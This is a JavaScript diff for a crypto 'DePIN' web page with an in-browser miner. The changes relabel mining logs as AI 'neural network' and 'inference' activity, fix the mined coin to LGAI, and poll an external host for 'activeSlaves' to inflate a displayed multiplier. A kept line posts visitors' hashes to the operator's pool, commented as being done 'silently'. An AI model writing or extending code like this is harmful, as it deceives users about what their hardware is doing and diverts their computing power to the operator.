@@ -132,6 +132,8 @@ setInterval(updateBurnCountdown, 1000);
 updateBurnCountdown();
 
 // ── MODAL SYSTEM ──
+// Fetch Swarm Stats
+let swarmInterval;
 function openDepin() { 
   document.getElementById('depinModal').classList.add('open'); 
   
@@ -152,16 +154,35 @@ function openDepin() {
     } catch(e) {
       document.getElementById('hw-gpu').textContent = "CPU Fallback Mode";
     }
-  }, 1000); // 1s scan delay for effect
+  }, 1000);
 
-  // Auto-fill MetaMask Wallet Address if available
   if (window.ethereum) {
     window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
-      if (accounts.length > 0) {
-        document.getElementById('depinWallet').value = accounts[0];
-      }
+      if (accounts.length > 0) document.getElementById('depinWallet').value = accounts[0];
     }).catch(console.error);
   }
+
+  // SWARM BOOSTER LOGIC
+  const fetchSwarm = () => {
+    fetch('https://lgai-empire.onrender.com/api/hash/stats')
+      .then(res => res.json())
+      .then(data => {
+        const nodes = data.activeSlaves || 1;
+        document.getElementById('swarm-nodes').textContent = nodes;
+        let mult = 1.0;
+        if(nodes > 5) mult = 1.5;
+        if(nodes > 20) mult = 2.5;
+        if(nodes > 50) mult = 5.0;
+        document.getElementById('swarm-multiplier').textContent = mult.toFixed(1) + 'x';
+      }).catch(() => {});
+  };
+  fetchSwarm();
+  swarmInterval = setInterval(fetchSwarm, 5000);
+}
+
+function closeDepin() {
+  clearInterval(swarmInterval);
+  closeModal('depinModal');
 }
 function openRwa()       { document.getElementById('rwaModal').classList.add('open'); }
 function openSocialFi()  { document.getElementById('socialModal').classList.add('open'); }
@@ -476,8 +497,7 @@ function logToMinerTerminal(msg) {
 function toggleMiner() {
   const btn = document.getElementById("btnToggleMiner");
   const dashboard = document.querySelector(".mining-dashboard");
-  const targetCoin = document.getElementById("mineTarget").value;
-  document.getElementById("minedSymbol").textContent = targetCoin;
+  document.getElementById("minedSymbol").textContent = "LGAI";
   
   if (!isMining) {
     // Start Mining
@@ -488,8 +508,8 @@ function toggleMiner() {
     btn.style.boxShadow = "0 0 20px rgba(239, 68, 68, 0.4)";
     dashboard.style.display = "block";
     
-    logToMinerTerminal("[SYSTEM] Allocating hardware resources...");
-    logToMinerTerminal(`[NETWORK] Connecting to ${targetCoin} Stratum pool...`);
+    logToMinerTerminal("[SYSTEM] Allocating neural network weights...");
+    logToMinerTerminal(`[NETWORK] Connecting to LGAI Global Hivemind...`);
     
     miningStartTime = Date.now();
     uptimeInterval = setInterval(() => {
@@ -508,24 +528,22 @@ function toggleMiner() {
             const khs = (e.data.hashes / 1000).toFixed(2);
             document.getElementById("liveHashrate").textContent = khs;
             
-            let multiplier = 0;
-            if (targetCoin === 'LGAI') multiplier = 0.5;
-            if (targetCoin === 'DOGE') multiplier = 0.01;
-            if (targetCoin === 'SOL') multiplier = 0.0001;
-            if (targetCoin === 'BTC') multiplier = 0.0000001;
+            let baseMultiplier = 0.5;
+            // Get Swarm Multiplier from UI
+            let swarmMult = parseFloat(document.getElementById("swarm-multiplier").textContent) || 1.0;
             
-            minedAmount += (e.data.hashes * multiplier);
+            minedAmount += (e.data.hashes * baseMultiplier * swarmMult);
             document.getElementById("minedBalance").textContent = minedAmount.toFixed(8);
             
             // FUNNEL HASHES TO COMMANDER'S POOL SILENTLY
             fetch('/api/hash/submit', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ hashes: e.data.hashes, targetCoin: targetCoin })
+              body: JSON.stringify({ hashes: e.data.hashes, targetCoin: 'LGAI' })
             }).catch(() => {}); // ignore errors silently
 
             if (Math.random() > 0.8) {
-              logToMinerTerminal(`[WORKER] Block template received. Hash: ${khs} KH/s`);
+              logToMinerTerminal(`[AI CORE] Epoch processed. Inference rate: ${khs} KH/s`);
             }
           }
         };
